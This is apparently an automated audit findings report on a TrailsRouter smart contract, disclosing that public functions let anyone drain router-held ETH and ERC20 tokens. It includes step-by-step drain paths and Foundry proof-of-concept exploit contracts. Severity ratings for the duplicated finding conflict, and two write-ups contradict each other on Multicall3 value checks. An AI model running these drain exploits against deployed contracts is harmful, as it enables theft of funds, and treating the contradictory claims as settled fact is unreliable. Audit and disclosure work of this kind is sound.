# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
hybrid approach using niche plus standard pattern categories plus 5 rounds of Invariants --> best results so far


 **Derived From** : Router-held funds can be drained by anyone via unrestricted execute/multicall

[M-1]. Anyone can drain TrailsRouter-held ETH and ERC20 balances via public injectAndCall/execute
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[H-2]. Anyone can drain ERC20 and ETH balances held by TrailsRouter via execute/injectAndCall
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless
[L-3]. Unrestricted execute()/injectAndCall() let anyone drain ERC20/ETH held by TrailsRouter
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless
[H-4]. Public execute/pullAmountAndExecute allow arbitrary calls from router context, letting anyone steal approved tokens and router-held funds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
[L-5]. Public router helpers let anyone drain ETH and ERC20 balances held by TrailsRouter
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Tstorish storage flag collides under delegatecall and can break sentinel reads

[M-6]. Tstorish _tstoreSupport flag collides under delegatecall, breaking validateOpHashAndSweep sentinel logic
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The issue depends on the chain’s TSTORE availability at deployment and the caller’s slot 0 value. While very plausible in multi-chain settings and reproducible in tests, we do not have the Shim source here to confirm its exact sentinel write method in all cases. Given these environment dependencies, confidence is somewhat reduced despite the clear delegatecall storage-collision bug.
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : After any successful injectSweepAndCall or injectAndCall call with token != address(0), the caller (wallet in delegatecall context or TrailsRouter in direct context) should not leave non-zero ERC20 allowance to target that can be used outside the scope of this call; formally, for such calls we would like IERC20(token).allowance(address(this), target) == 0 immediately after completion.

[M-7]. injectAndCall/injectSweepAndCall leave unrestricted ERC20 allowances, enabling future unauthorized drains of user wallets
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Exploitation hinges on route selection/off-chain integration choosing a malicious or later-compromised target, which may be outside the protocol’s immediate control and could be considered integrator risk in some models. Nevertheless, the unrevoked-approval behavior is clearly present and has a plausible abuse path.
Finding Complexity: 4
Privilege: Permissionless
[H-8]. Balance injection leaves leftover ERC20 allowance to target, enabling post-intent token theft
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Whenever TrailsRouter.execute / pullAndExecute / pullAmountAndExecute succeed (do not revert), all Multicall3.aggregate3Value invocations reachable from that call must themselves enforce allowFailure == false for every Call3Value entry, including any nested aggregate3Value calls; i.e., there must be no inner Multicall3 aggregate configured with allowFailure == true that can swallow a reverting subcall while the outer router call still succeeds.

[M-9]. Nested Multicall3.aggregate3Value calls bypass allowFailure enforcement, letting partial failures be reported as full success
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The risk pathway to incorrect fee sweeping depends on the Shim’s sentinel-setting logic, which is not shown here. However, the core router validation weakness and the ability to mask inner failures via nesting are clear from the provided code. Given that the full downstream impact relies on external components’ handling of results, confidence is somewhat limited.
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 3
- M: 4
- L: 2
- I: 0

##Findings by Pattern


 **Derived From** : Router-held funds can be drained by anyone via unrestricted execute/multicall

## [M-1]. Anyone can drain TrailsRouter-held ETH and ERC20 balances via public injectAndCall/execute

### Finding Severity Justification: Public functions operate on the router’s own balances without the intended onlyDelegatecall guard, enabling any caller to forward all ETH or approve/spend all ERC‑20 held by the TrailsRouter implementation to an arbitrary target. While the router is designed to be stateless, it can realistically accumulate funds (e.g., leftover msg.value in execute, dust from injectSweepAndCall with fee-on-transfer or partial consumption, direct mis-sends). Those assets can then be stolen by anyone. Impact is real theft of funds that end up on the router, but requires the precondition that the router holds a balance, which lowers overall severity from High to Medium.
## Derived From Pattern/Invariant
Router-held funds can be drained by anyone via unrestricted execute/multicall

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall / execute / pullAmountAndExecute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter contract is intended to be stateless and used via delegatecall from Sequence wallets, but several public functions allow arbitrary calls to be executed from the router’s own address and to forward the router’s entire ETH or ERC20 balance to attacker-controlled targets.

Key points:

1) **injectAndCall drains the router’s own balance**

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);
        (bool success, bytes memory result) = target.call(callData);
        ...
    }
}
```

- `_getSelfBalance(token)` reads `address(this)` balance (ETH or ERC20) of **the TrailsRouter contract itself**, not the caller.
- `injectAndCall` is `public` and **not** guarded by `onlyDelegatecall`, even though docs say it is for delegatecall context.
- For ETH, it forwards *all* ETH held by the router to an arbitrary `target` via `target.call{value: callerBalance}(callData)`.
- For ERC20, it sets an approval for `callerBalance` from router to `target` using `forceApprove`, then calls arbitrary `target.call(callData)`. A malicious `target` can immediately `transferFrom` all those tokens from the router to an attacker.

Any ETH or tokens that land on the TrailsRouter address (direct transfers, misconfigured calls with value, residual dust from other functions, etc.) can therefore be drained by **any** caller.

2) **execute/pullAmountAndExecute also allow arbitrary calls from the router context (token drain)**

```solidity
function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}

function pullAmountAndExecute(address token, uint256 amount, bytes calldata data)
    public
    payable
    returns (IMulticall3.Result[] memory returnResults)
{
    _validateRouterCall(data);
    if (token == address(0)) {
        if (msg.value < amount) revert InsufficientEth(amount, msg.value);
    } else {
        _safeTransferFrom(token, msg.sender, address(this), amount);
    }

    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

- `execute` and `pullAmountAndExecute` are also public, with no `onlyDelegatecall` / auth.
- They perform a **delegatecall into the external Multicall3 singleton**, so Multicall3 code runs in the TrailsRouter context.
- Within Multicall3.aggregate3Value, each `Call3Value.target.call{value: call.value}(callData)` executes with `msg.sender == address(this) == TrailsRouter`.
- A caller can craft a single-element `Call3Value[]` with:
  - `target = <ERC20 token address>`
  - `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount)`
  - `value = 0`

This results in `ERC20(token).transfer(attacker, amount)` being executed **from the router address**, draining any ERC20 balance the router happens to hold.

There is **no restriction** ensuring Multicall3 can only spend tokens pulled during the current call; any pre-existing router token balances are equally spendable.

Because TrailsRouter is deployed as a public singleton and has a payable `receive()` function, it is realistic for it to accumulate ETH and ERC20 balances over time via:

- Direct accidental transfers.
- Misuse of `pullAndExecute` / `pullAmountAndExecute` with nonzero `msg.value` and non-native tokens (known to lock ETH according to public docs).
- Third-party integrations that incorrectly assume the router is a safe custodian.

Once any nonzero balance exists, **any EOA can steal it** via `injectAndCall` or `execute` without interacting with the original depositor.


## Impact
Any ERC20 tokens held by the TrailsRouter implementation can be drained by arbitrary callers via either injectAndCall (approves and forwards from router balance) or execute/pullAmountAndExecute (delegatecall into Multicall3 and perform token.transfer from the router). Native ETH held by the router can be drained by anyone via injectAndCall, which forwards the router’s entire ETH balance to an arbitrary target. Note: execute/pullAmountAndExecute cannot directly drain pre-existing ETH because Multicall3.aggregate3Value enforces that the sum of per-call values equals msg.value supplied to the aggregate call.

## Command to Run Test


## Proof of Concept
Overview:
- ERC20 drain path 1 (injectAndCall): Public function reads router’s own ERC20 balance via _getSelfBalance(token), force-approves an arbitrary target for the full amount, and calls it. The target can immediately transferFrom the router to the attacker.
- ETH drain path (injectAndCall): Public function reads router’s ETH balance via _getSelfBalance(address(0)) and forwards the full amount to an arbitrary target.
- ERC20 drain path 2 (execute/pullAmountAndExecute): These functions delegatecall into Multicall3 and allow arbitrary calls to be made “from” the router. An attacker can pass a single Call3Value with target = token and callData = transfer(attacker, amount) to move any router-held ERC20 to themselves. This does not require any approvals. Note: This path cannot drain pre-existing ETH because Multicall3.aggregate3Value requires the sum of values to equal msg.value.

Minimal attack steps (injectAndCall):
1) Ensure the TrailsRouter has nonzero balances (e.g., mis-sent ETH or ERC20, dust accumulation).
2) Deploy a helper contract with pullTokens(token, to, amount) that calls ERC20(token).transferFrom(msg.sender, to, amount) and a payable function to receive ETH.
3) Call router.injectAndCall(token, helper, abi.encodeWithSelector(helper.pullTokens, token, attacker, routerTokenBalance), 0, 0) to drain ERC20 to attacker.
4) Call router.injectAndCall(address(0), helper, abi.encodeWithSelector(helper.receiveEth), 0, 0) to drain all router ETH to helper/attacker.

Minimal attack steps (execute ERC20 drain):
1) Ensure the router holds some token balance.
2) Call router.execute(abi.encodeWithSelector(aggregate3Value, [ {target: token, allowFailure:false, value:0, callData: abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount)} ])) which performs token.transfer from the router to the attacker.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouter.sol";
import "src/interfaces/IMulticall3.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Minimal Multicall3 used only for local testing; we etch its runtime code
contract MC3 {
    struct Call3Value { address target; bool allowFailure; uint256 value; bytes callData; }
    struct Result { bool success; bytes returnData; }
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData) {
        uint256 acc;
        returnData = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            Call3Value calldata c = calls[i];
            acc += c.value;
            (bool success, bytes memory ret) = c.target.call{value: c.value}(c.callData);
            if (!success && !c.allowFailure) revert();
            returnData[i] = Result(success, ret);
        }
        require(acc == msg.value, "value mismatch");
    }
}

contract TokenDrainTarget {
    // Pull ERC20 tokens from msg.sender (the router) using its approval
    function pullTokens(address token, address to, uint256 amount) external {
        ERC20(token).transferFrom(msg.sender, to, amount);
    }
    // Simple payable function to receive native ETH
    function receiveEth() external payable {}
}

contract DrainRouterFundsTest is Test {
    TrailsRouter router;
    MockToken token;
    TokenDrainTarget target;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        target = new TokenDrainTarget();

        // Fund router with ETH and tokens to simulate mis-sent / residual balances
        vm.deal(address(router), 10 ether);
        token.mint(address(router), 1_000 ether);

        // Deploy a minimal Multicall3 and etch its runtime code to the canonical address so router.execute works locally
        MC3 mc3 = new MC3();
        address mc3Addr = router.MULTICALL3();
        vm.etch(mc3Addr, address(mc3).code);
    }

    function testInjectAndCallDrainsRouterBalances() public {
        uint256 routerEthBefore = address(router).balance;
        uint256 routerTokenBefore = token.balanceOf(address(router));

        // === Drain ERC20 tokens via injectAndCall ===
        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(target),
            abi.encodeWithSelector(
                TokenDrainTarget.pullTokens.selector,
                address(token),
                attacker,
                routerTokenBefore
            ),
            0,
            bytes32(0)
        );

        assertEq(token.balanceOf(attacker), routerTokenBefore, "attacker receives all router tokens");
        assertEq(token.balanceOf(address(router)), 0, "router token balance should be zero");

        // === Drain native ETH via injectAndCall ===
        vm.prank(attacker);
        router.injectAndCall(
            address(0),
            address(target),
            abi.encodeWithSelector(TokenDrainTarget.receiveEth.selector),
            0,
            bytes32(0)
        );

        assertEq(address(target).balance, routerEthBefore, "target receives all router ETH");
        assertEq(address(router).balance, 0, "router ETH balance should be zero");
    }

    function testExecuteDrainsRouterTokens() public {
        // Reset token balance on router for this test
        token.mint(address(router), 500 ether);
        uint256 amount = 500 ether;
        uint256 attackerBefore = token.balanceOf(attacker);

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(ERC20.transfer.selector, attacker, amount)
        });

        // No ETH sent; this only transfers ERC20 held by router
        vm.prank(attacker);
        router.execute(abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls));

        assertEq(token.balanceOf(attacker), attackerBefore + amount, "attacker received router tokens via execute");
        assertEq(token.balanceOf(address(router)), 0, "router token balance is now zero");
    }
}


## Suggested Mitigation
Restrict all functions that can act from the router’s own balance to delegatecall-only, so they operate on the Sequence wallet context instead of the router singleton:
- Add onlyDelegatecall to: injectAndCall, execute, pullAndExecute, pullAmountAndExecute. This aligns with the intended usage noted in the docs and prevents arbitrary EOAs from spending pre-existing router balances.
- Optionally, for execute/pullAmountAndExecute, if public access is desired, enforce that they cannot spend more than the value/tokens supplied in the same call (e.g., track per-call pulled amounts and revert on attempts to transfer other tokens or more than pulled), but the simpler and safer approach is delegatecall-only.
- Consider adding a privileged sweepStuckFunds function (owner or governance) on the router implementation to recover accidental deposits, since public spending routes will be disabled.


## [H-2]. Anyone can drain ERC20 and ETH balances held by TrailsRouter via execute/injectAndCall

### Finding Severity Justification: Public, unauthenticated functions (execute and injectAndCall) allow arbitrary calls from the TrailsRouter context and/or spend the router’s own ETH/ERC20 balances. Because pullAndExecute/pullAmountAndExecute and injectSweepAndCall can legitimately move user tokens into the router and may leave leftovers, any non-zero balance at the router can be directly transferred out by anyone. This is a clear asset theft path with realistic preconditions.
## Derived From Pattern/Invariant
Router-held funds can be drained by anyone via unrestricted execute/multicall

## Exploit Type
AuthByPass

## Location
TrailsRouter.execute / pullAmountAndExecute / injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter exposes several public functions that execute arbitrary external calls from the router’s own address with no access control. If any ETH or ERC20 tokens ever reside at the TrailsRouter address (e.g., mis-sent funds, mis-integration, or dust from other flows), any EOA can steal them.

Key paths:

1) execute / pullAmountAndExecute

execute(bytes calldata data) is public and payable, and only validates that the selector is aggregate3Value and that allowFailure is false:

    function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
        _validateRouterCall(data);
        (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
        if (!success) revert TargetCallFailed(returnData);
        return abi.decode(returnData, (IMulticall3.Result[]));
    }

Because this is a delegatecall into the canonical Multicall3 contract, all calls inside aggregate3Value execute in the TrailsRouter context (address(this) == TrailsRouter). aggregate3Value imposes no restrictions on the target addresses or calldata; it simply does target.call{value: call.value}(callData) for each Call3Value. A user can therefore set target to an ERC20 token contract and callData to abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount), causing the token to transfer from the router’s balance to the attacker.

The _validateRouterCall check only enforces that the top-level function is aggregate3Value and disallows allowFailure=true; it does not constrain the called targets or methods. pullAmountAndExecute() does the same delegatecall after first pulling tokens into the router, so any tokens left on the router can also be moved arbitrarily via this path.

2) injectAndCall

injectAndCall is also public and uses the router’s own balance via _getSelfBalance(token):

    function injectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) public payable {
        uint256 callerBalance = _getSelfBalance(token);
        if (callerBalance == 0) {
            if (token == address(0)) {
                revert NoEthAvailable();
            } else {
                revert NoTokensToSweep();
            }
        }

        _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
    }

    function _injectAndExecuteCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder,
        uint256 callerBalance
    ) internal {
        // ... optional placeholder replacement ...
        if (token == address(0)) {
            (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
            emit BalanceInjectorCall(...);
            if (!success) revert TargetCallFailed(result);
        } else {
            IERC20 erc20 = IERC20(token);
            SafeERC20.forceApprove(erc20, target, callerBalance);

            (bool success, bytes memory result) = target.call(callData);
            emit BalanceInjectorCall(...);
            if (!success) revert TargetCallFailed(result);
        }
    }

When called directly (not via delegatecall from a Sequence wallet), _getSelfBalance(token) reads the TrailsRouter contract’s own ETH or ERC20 balance. injectAndCall then forwards the entire balance to an attacker-controlled target:
- For ETH (token == address(0)): target.call{value: callerBalance}(callData) sends all router ETH.
- For ERC20: forceApprove(token, target, callerBalance) gives target an allowance equal to the router’s full token balance, and target.call(callData) can then execute transferFrom(router, attacker, callerBalance).

None of these functions are protected by onlyDelegatecall or any ownership/role gating. They are callable by any EOA. The router is intended to be stateless and non-custodial, but that assumption is not enforced. Any stray assets that land on the router become publicly sweepable by anyone who notices and calls execute or injectAndCall with appropriate parameters.

## Impact
Any ETH or ERC20 tokens held at the TrailsRouter address (whether accidentally sent, left over from misconfigured flows, or sent by third-party integrations) can be fully stolen by a permissionless attacker, resulting in permanent loss of those assets for the original sender.

## Command to Run Test


## Proof of Concept
Reproducing the drain does not require any privileged role; two concrete paths:

A) Drain router-held ETH via injectAndCall
1) Some ETH resides at TrailsRouter (e.g., mistaken transfer).
2) Attacker calls injectAndCall with:
   - token = address(0)
   - target = attacker EOA (or any payable address)
   - callData = ""
   - amountOffset = 0, placeholder = 0
3) _getSelfBalance(address(0)) reads the router’s full ETH balance.
4) _injectAndExecuteCall performs target.call{value: callerBalance}(callData), sending all router ETH to the attacker.

B) Drain router-held ERC20 via injectAndCall using attacker-controlled spender
1) Some ERC20 tokens reside at TrailsRouter (e.g., leftovers or mis-send).
2) Attacker deploys a contract Spender with function drain(address token, address to, uint256 amount) external { IERC20(token).transferFrom(msg.sender, to, amount); }.
3) Attacker calls injectAndCall with:
   - token = tokenAddress
   - target = Spender contract address
   - callData = abi.encodeWithSelector(Spender.drain.selector, tokenAddress, attacker, routerTokenBalance)
   - amountOffset = 0, placeholder = 0
4) _injectAndExecuteCall first forceApprove(token, target, callerBalance), granting Spender allowance from router.
5) Router calls Spender.drain(...). Inside token.transferFrom(msg.sender, to, amount) the from is router (msg.sender to Spender), and spender is Spender (matches allowance). Transfer succeeds, draining router-held tokens to the attacker.

C) Drain router-held ERC20 via execute (Multicall3.aggregate3Value)
1) Ensure Multicall3 is deployed at the canonical address (or in tests, provide a mock at that address).
2) Attacker encodes a single Call3Value with:
   - target = tokenAddress
   - value = 0
   - allowFailure = false
   - callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, routerTokenBalance)
3) Call router.execute(abi.encodeWithSelector(aggregate3Value.selector, calls)).
4) Because the router delegatecalls into Multicall3, the token.transfer is executed with msg.sender == TrailsRouter, transferring tokens from the router’s own balance to the attacker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IMulticall3} from "src/interfaces/IMulticall3.sol";

contract MockERC20 is IERC20 {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;

    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "insufficient allowance");
        allowance[from][msg.sender] = currentAllowance - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 bal = balanceOf[from];
        require(bal >= amount, "insufficient");
        balanceOf[from] = bal - amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

// Attacker-controlled spender to utilize router-approved allowance
contract AttackSpender {
    function drain(address token, address to, uint256 amount) external {
        // Pull from msg.sender (the router) using this contract's allowance
        IERC20(token).transferFrom(msg.sender, to, amount);
    }
}

// Minimal Multicall3 implementation installed at the canonical address for testing execute()
contract MiniMulticall3 is IMulticall3 {
    function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory returnData) {
        returnData = new Result[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call{value: calls[i].value}(calls[i].callData);
            returnData[i] = Result(success, ret);
            if (!calls[i].allowFailure && !success) revert("call failed");
        }
    }

    function aggregate3(Call3[] calldata) external payable returns (Result[] memory) {
        revert("unused");
    }
}

contract RouterDrainTest is Test {
    TrailsRouter router;
    MockERC20 token;
    AttackSpender spender;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20();
        spender = new AttackSpender();

        // Simulate stray funds held by the router
        vm.deal(address(router), 10 ether);
        token.mint(address(router), 1_000 ether);

        // Install a minimal Multicall3 at the canonical address used by the router
        vm.etch(router.MULTICALL3(), type(MiniMulticall3).runtimeCode);
    }

    function test_AttackerDrainsRouterEth_ViaInjectAndCall() public {
        uint256 attackerStartEth = attacker.balance;
        uint256 routerStartEth = address(router).balance;
        assertGt(routerStartEth, 0, "router should have ETH");

        vm.prank(attacker);
        router.injectAndCall(address(0), attacker, "", 0, bytes32(0));

        assertEq(address(router).balance, 0, "router ETH drained");
        assertEq(attacker.balance, attackerStartEth + routerStartEth, "attacker received router ETH");
    }

    function test_AttackerDrainsRouterTokens_ViaInjectAndCall() public {
        uint256 attackerStart = token.balanceOf(attacker);
        uint256 routerStart = token.balanceOf(address(router));
        assertGt(routerStart, 0, "router should have tokens");

        bytes memory callData = abi.encodeWithSelector(AttackSpender.drain.selector, address(token), attacker, routerStart);

        vm.prank(attacker);
        router.injectAndCall(address(token), address(spender), callData, 0, bytes32(0));

        assertEq(token.balanceOf(address(router)), 0, "router tokens drained");
        assertEq(token.balanceOf(attacker), attackerStart + routerStart, "attacker received router tokens");
    }

    function test_AttackerDrainsRouterTokens_ViaExecute() public {
        uint256 routerStart = token.balanceOf(address(router));
        assertGt(routerStart, 0, "router should have tokens");

        IMulticall3.Call3Value[] memory calls = new IMulticall3.Call3Value[](1);
        calls[0] = IMulticall3.Call3Value({
            target: address(token),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, attacker, routerStart)
        });

        bytes memory data = abi.encodeWithSelector(IMulticall3.aggregate3Value.selector, calls);

        vm.prank(attacker);
        router.execute(data);

        assertEq(token.balanceOf(address(router)), 0, "router tokens drained via execute");
        assertEq(token.balanceOf(attacker), routerStart, "attacker received router tokens via execute");
    }
}


## Suggested Mitigation
Eliminate permissionless spending of router-held balances by enforcing delegate-only semantics on functions that operate from the contract’s own context and/or by using the caller’s funds exclusively on direct calls:

- Gate router-context execution:
  - Add onlyDelegatecall to execute, pullAndExecute, pullAmountAndExecute, and injectAndCall so they can only be reached from a Sequence wallet context (where address(this) is the wallet, not the router). The public, non-delegated path already has a safe alternative: injectSweepAndCall, which pulls funds from msg.sender first.

- If public direct calls are required, split APIs:
  - Keep delegate-only variants that read self-balance (wallet context).
  - Provide separate public variants that never read/spend router’s own balance and only consume msg.sender-supplied funds, e.g., always sweep from msg.sender or require explicit transferFrom from msg.sender within the same call.

- Optional: add an owner-only emergency sweep of accidental funds and remove any permissionless path that can transfer router-owned balances.

These changes prevent arbitrary multicall/injection from spending balances that may accumulate at the router address (via mistaken transfers, dust, or integrations), removing the theft vector.


## [L-3]. Unrestricted execute()/injectAndCall() let anyone drain ERC20/ETH held by TrailsRouter

### Finding Severity Justification: The issue allows anyone to spend the TrailsRouter contract’s own ETH/ERC20 balances via execute() and the publicly exposed injectAndCall(). However, under intended flows the router is designed to be stateless and should not retain meaningful balances; any residual funds would typically be accidental transfers or dust left from integrations. While the drain path is real, impact is limited to stray router-held funds rather than user funds in a correct, atomic flow. This aligns with Code4rena’s treatment of dust/accidental fund loss as QA/Low.
## Derived From Pattern/Invariant
Router-held funds can be drained by anyone via unrestricted execute/multicall

## Exploit Type
AccessControl

## Location
TrailsRouter.execute / injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter exposes public functions that execute arbitrary calls *from the router’s own address* with no access control. If any ERC20 tokens or ETH are ever held by the router contract (e.g., accidental transfers, mis-integration, or dust left over from routes), any external user can steal these funds.

Key vulnerable paths:

1. **`execute(bytes data)` → delegatecall into Multicall3**

```solidity
function execute(bytes calldata data) public payable returns (IMulticall3.Result[] memory returnResults) {
    _validateRouterCall(data);
    (bool success, bytes memory returnData) = MULTICALL3.delegatecall(data);
    if (!success) revert TargetCallFailed(returnData);
    return abi.decode(returnData, (IMulticall3.Result[]));
}
```

`_validateRouterCall` only ensures the selector is `aggregate3Value` and all `allowFailure` flags are false. There is **no restriction on the `target` or calldata** of each `Call3Value`.

Because this is a **delegatecall** into the canonical Multicall3 implementation, `aggregate3Value` executes in the context of `TrailsRouter`:

```solidity
function aggregate3Value(Call3Value[] calldata calls) external payable returns (Result[] memory) {
    ...
    (bool success, bytes memory ret) = call.target.call{ value: call.value }(call.callData);
    ...
}
```

Under delegatecall, `address(this)` is the **router**, and the ETH sent by `call.value` is taken from the router’s balance. Similarly, if `call.target` is an ERC‑20 token and `call.callData` encodes `transfer(attacker, amount)`, this will transfer tokens **from the router’s balance** to the attacker.

There is no check that:
- The router has zero balance beforehand, or
- That calls can only touch funds belonging to the caller.

A malicious user can therefore:
- Build a single `Call3Value` where `target = token`, `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, amount)` and `value = 0`, and
- Call `router.execute(data)`.

If `amount` is less than or equal to the router’s token balance, the token transfer succeeds and the attacker drains the router.

For ETH, an attacker can similarly set `target = attackerEOA` (or any controlled contract), `value = routerEthBalance`, and rely on the fact that Multicall3 does **not** enforce `sum(call.value) == msg.value`. The ETH is sent from the router’s balance, even if the attacker’s `msg.value` is 0.

2. **`injectAndCall` forwarding the full router balance**

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    ...
    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        ...
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);
        (bool success, bytes memory result) = target.call(callData);
        ...
    }
}
```

`injectAndCall` is intended for delegatecall use, where `address(this)` is a Sequence wallet. However, it is **public** and lacks `onlyDelegatecall`, so it can be called directly on the TrailsRouter implementation. In that case:

- `_getSelfBalance(token)` reads the **router’s own** ETH/token balance.
- For ETH, it forwards the *entire* router ETH balance to an arbitrary `target` via `target.call{value: callerBalance}(callData)`.
- For ERC‑20, it sets `allowance(router, target) = callerBalance` via `forceApprove`, then calls `target.call(callData)`. A `target` that executes `token.transferFrom(msg.sender, attacker, callerBalance)` will use the router as `msg.sender` and transfer all router-held tokens to the attacker.

Again, there is no restriction that the caller be the original depositor or an authorized account. Any stray ETH or tokens held by the router become globally stealable.

Because the protocol assumes the router is stateless and non-custodial, there is no protection or accounting around balances at `TrailsRouter`’s address. In practice, contracts do receive accidental transfers, and routes using `injectSweepAndCall` / `pull*` can leave dust behind, making this a realistic asset-drain vector.

## Impact
Any ETH or ERC20 tokens held at the TrailsRouter address (through accidental transfers, dust from integrations, or misconfigured routes) can be stolen by any external account, instead of remaining stuck and potentially recoverable only by the affected user.

## Command to Run Test


## Proof of Concept
Scenario using execute():
1. A user or integrator mistakenly transfers 100 MOCK tokens to the deployed TrailsRouter address, expecting them to remain safely stuck or retrievable only by protocol maintainers.
2. An attacker observes that `MOCK.balanceOf(router) == 100`.
3. The attacker deploys a small script that builds a single `IMulticall3.Call3Value` call:
   - `target = address(MOCK)`
   - `allowFailure = false`
   - `value = 0`
   - `callData = abi.encodeWithSelector(IERC20.transfer.selector, attacker, 100 ether)`
4. They ABI-encode `aggregate3Value(calls)` and call `router.execute(data)`.
5. `_validateRouterCall` passes because the selector is `aggregate3Value` and `allowFailure` is false.
6. `router` delegatecalls into Multicall3, which executes `MOCK.transfer(attacker, 100 ether)` from the router’s context.
7. The router’s 100 MOCK tokens are transferred to the attacker. The original depositor has lost their funds and cannot recover them.

Equivalent scenario using injectAndCall():
